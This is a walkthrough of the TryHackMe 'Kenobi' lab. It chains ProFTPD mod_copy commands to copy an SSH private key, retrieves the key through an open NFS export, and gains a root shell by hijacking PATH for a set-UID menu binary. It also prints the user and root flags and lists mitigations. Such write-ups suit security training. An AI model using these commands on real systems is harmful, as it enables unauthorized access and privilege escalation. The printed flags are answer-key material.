---
title: "TryHackMe: Kenobi"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_kenobi/
image:
  path: room_img.png
description: "how insecure FTP configurations, overly permissive NFS exports, and poorly coded set-UID scripts can be chained together to achieve full system compromise."

---

## Overview

* **Target IP:** 10.10.82.31
* **Objective:** Obtain user and root flags by exploiting ProFTPD `mod_copy` and local privilege escalation.
* **Author:** NeoVirex
* **Date:** June 6, 2025

---

## 1. Reconnaissance & Service Enumeration

### 1.1 Nmap Scan

A full TCP port scan reveals:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 (Ubuntu)
80/tcp   open  http        Apache 2.4.18 (Ubuntu)
111/tcp  open  rpcbind     RPC 2‐4
139/tcp  open  netbios-ssn Samba smbd 3.X–4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
2049/tcp open  nfs         NFS 2–4
37597   open   nlockmgr    RPC
41307   open   mountd      RPC
43781   open   mountd      RPC
51631   open   mountd      RPC
```

* **FTP (21):** ProFTPD 1.3.5
* **SSH (22):** OpenSSH 7.2p2
* **HTTP (80):** Apache 2.4.18
* **SMB (139/445):** Samba smbd 4.3.11-Ubuntu (workgroup WORKGROUP, host KENOBI)
* **NFS (2049):** Exported `/var` (as confirmed later)

### 1.2 SMB Share Enumeration

```bash
smbclient //10.10.82.31/anonymous -N
```

* **Result:** Only `log.txt` is present in `/home/kenobi/share`.

```bash
get log.txt
```

* **`log.txt` contains:**

  * Evidence that ProFTPD is running as user `kenobi`.
  * Confirmation that an SSH key pair was generated at `/home/kenobi/.ssh/id_rsa`.

---

## 2. Exploitation & Initial Access

### 2.1 ProFTPD `mod_copy` Vulnerability

Because ProFTPD 1.3.5 includes the `mod_copy` module, unauthenticated clients can use these commands to copy arbitrary files. Since ProFTPD is running under the `kenobi` user, it can read `/home/kenobi/.ssh/id_rsa`.

#### 2.1.1 Verify FTP Banner with Netcat

```bash
nc 10.10.82.31 21
```

```text
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.82.31]
```

#### 2.1.2 Copy Kenobi’s Private Key to a Writable Location

> **Commands (typed in raw netcat session):**

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
QUIT
```

* **`SITE CPFR /home/kenobi/.ssh/id_rsa`**: Tells ProFTPD to “copy from” Kenobi’s private key.

  * Response: `350 File or directory exists, ready for destination name`
* **`SITE CPTO /var/tmp/id_rsa`**: Tells ProFTPD to “copy to” `/var/tmp/id_rsa`.

  * Response: `250 Copy successful`
* **`QUIT`**: Closes the FTP session.
* **Result:** The file `/home/kenobi/.ssh/id_rsa` is now at `/var/tmp/id_rsa`.

---

## 3. Retrieving the Private Key via NFS

### 3.1 Confirm NFS Exports

```bash
showmount -e 10.10.82.31
```

```
Export list for 10.10.82.31:
/var *(rw,no_subtree_check,async)
```

* **Conclusion:** The entire `/var` directory is available via NFS.

### 3.2 Mount `/var` on Attacker Machine

```bash
sudo mkdir -p /mnt/kenobiNFS
sudo mount 10.10.82.31:/var /mnt/kenobiNFS
```

### 3.3 Verify and Copy `id_rsa`

```bash
ls -l /mnt/kenobiNFS/tmp
```

```
total 20
-rw-r--r-- 1 neo neo 1675 Jun 6 13:45 id_rsa
...
```

* **Result:** `/mnt/kenobiNFS/tmp/id_rsa` exists and is Kenobi’s private key.

```bash
cp /mnt/kenobiNFS/tmp/id_rsa ~/pro/k/kenobi_id_rsa
chmod 600 ~/pro/k/kenobi_id_rsa
```

---

## 4. SSH into Kenobi’s Account

```bash
ssh -i ~/pro/k/kenobi_id_rsa kenobi@10.10.82.31
```

* **First-time Connection Prompt:** Accept the host key fingerprint.
* **Successful Login:** Drop directly into Kenobi’s shell:

```text
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

kenobi@kenobi:~$ ls -l
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt

kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

* **User Flag Obtained:** `d0b0f3f53b6caa532a83915e19224899`.

---

## 5. Privilege Escalation to Root

### 5.1 Local Enumeration as Kenobi

```bash
kenobi@kenobi:~$ uname -r
4.8.0-58-generic

kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/at
/usr/bin/passwd
...
```

* No obvious vulnerable SUID binaries directly (e.g., no outdated SUID in `/usr/local/bin`).
* Kernel version `4.8.0-58-generic` suggests tooling like `Dirty Pipe` is not applicable (Linux 5.8+).

### 5.2 PATH Manipulation via Vulnerable Script

The binary `/usr/bin/menu` runs under `kenobi` and is in the default PATH. It executes certain commands (status check, kernel version, `ifconfig`) by name—without specifying absolute paths. This allows us to hijack one of those commands.

#### 5.2.1 Create a Malicious `curl` in `/tmp`

```bash
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo "/bin/sh" > curl
kenobi@kenobi:/tmp$ chmod 777 curl
```

* **Explanation:**

  * We create a small script named `curl` that simply invokes `/bin/sh`.
  * By granting `777` permissions and placing it in `/tmp`, we ensure `/tmp/curl` is executable by `menu`.

#### 5.2.2 Prepend `/tmp` to PATH and Execute `menu`

```bash
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu
```

* **`menu` Behavior (pseudocode):**

  1. Prompt: “Enter your choice :”
  2. If option `1` (status check) is selected, it runs `curl localhost`

     * Since `/tmp` is at the front of `$PATH`, our malicious `/tmp/curl` is executed instead of the system binary.
     * That spawns a root shell because `menu` is set-UID and running as root (verified by `id` after exploitation).

#### 5.2.3 Steps in `menu` Prompt

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
```

* After choosing `1`, the prompt runs `/tmp/curl`, which is our shell payload.
* We immediately become root:

```text
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),27(sudo),...
```

### 5.3 Capture Root Flag

```bash
# ls /root
root.txt

# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

* **Root Flag Obtained:** `177b3cd8562289f37382721c28381f02`.

---

## 6. Cleanup & Recommendations

* **Unmount NFS share:**

  ```bash
  exit      # exit from Kenobi’s shell if still active
  sudo umount /mnt/kenobiNFS
  ```
* **Remove local copies of private key:**

  ```bash
  rm ~/pro/k/kenobi_id_rsa
  ```
* **Mitigations:**

  1. **Disable or restrict** the ProFTPD `mod_copy` module if not needed, or upgrade ProFTPD to a patched version.
  2. **Limit NFS exports** to trusted IPs only (do not export `/var` publicly).
  3. **Audit set-UID binaries** and ensure scripts like `menu` fully qualify command paths (i.e., use `/usr/bin/curl` instead of `curl`).
  4. **Implement principle of least privilege**—do not run ProFTPD under a privileged user with SSH keys accessible; use a dedicated FTP-only account.

---

## 7. Conclusion

1. **Initial Access:**

   * Exploited the ProFTPD 1.3.5 `mod_copy` vulnerability (CVE-2015-3306 / CVE-2019-12815) to copy `/home/kenobi/.ssh/id_rsa` to `/var/tmp/id_rsa`.
   * Retrieved the private key via the NFS-mounted `/var` directory.
   * SSH’ed in as `kenobi` without needing a password.

2. **Privilege Escalation:**

   * Identified a set-UID script (`/usr/bin/menu`) that invoked commands from `$PATH`.
   * Placed a malicious `curl` binary in `/tmp` and prepended `/tmp` to `$PATH`.
   * Executed `menu` to spawn a root shell and accessed `/root/root.txt`.

This writeup shows how insecure FTP configurations, overly permissive NFS exports, and poorly coded set-UID scripts can be chained together to achieve full system compromise. Always keep services up to date, restrict filesystem exports, and avoid relying on user-supplied PATH entries in privileged binaries.


## Lateral Movement
<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
